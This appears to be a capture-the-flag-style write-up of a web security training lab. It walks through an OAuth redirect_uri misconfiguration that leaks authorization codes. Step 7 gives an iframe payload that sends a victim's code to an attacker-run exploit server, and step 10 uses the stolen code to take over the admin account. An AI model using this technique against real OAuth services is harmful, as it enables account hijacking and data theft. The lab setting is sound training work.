## Background  
A misconfiguration by the OAuth provider makes it possible for an attacker to **steal authorization codes** associated with other users' accounts so that they can get access to the victim's data.  
攻击者可能会以受害者用户身份登录任何注册了此 OAuth 服务的客户端应用程序.  
To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.  
You can log in with your own social media account using the following credentials: wiener:peter.  

## Steps  

1. With Burp is on, click to log in with the credentials and complete the OAuth login process.  

2. Log out and then log in again. Notice this time you don't need to enter your credentials to log in.  

3. In burp, find the most recent authorisation request, which is GET /auth?client_id=[...]. Notice you wil be redirected to the redirect_uri with the authorisation code. Send this to Repeater.   
![image](https://user-images.githubusercontent.com/106157137/176818607-fa98217f-4129-4522-94e3-4ef8ab343f8f.png)  
 
4. Change the redirect_uri to different values and it will always return 302 response.  

5. Chanage the redirect_uri to the exploit server. Send the request and show the response in browser.  
![image](https://user-images.githubusercontent.com/106157137/176818830-8b61f0fc-f31b-4965-a41f-d9fe283dd436.png)  

6. In the exploit server's access log, we will see there is an entry containing an authorisation code. This means you can leak authorisation codes to an external domain.  
![image](https://user-images.githubusercontent.com/106157137/176819368-6d92b826-e7d4-499b-80fc-0466cc1a9843.png)  

7. Go back to the exploit server, create an iframe at /exploit:  
`<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>`  

8. Store the exploit and click "view exploit". Check the exploit server's acess log. You will see another entry with a leaked code.  

9. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.  

10. Log out and then use the stolen authorisation code to fill the url:  
`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`  

11. You will be automatically logged in as the admin user.  
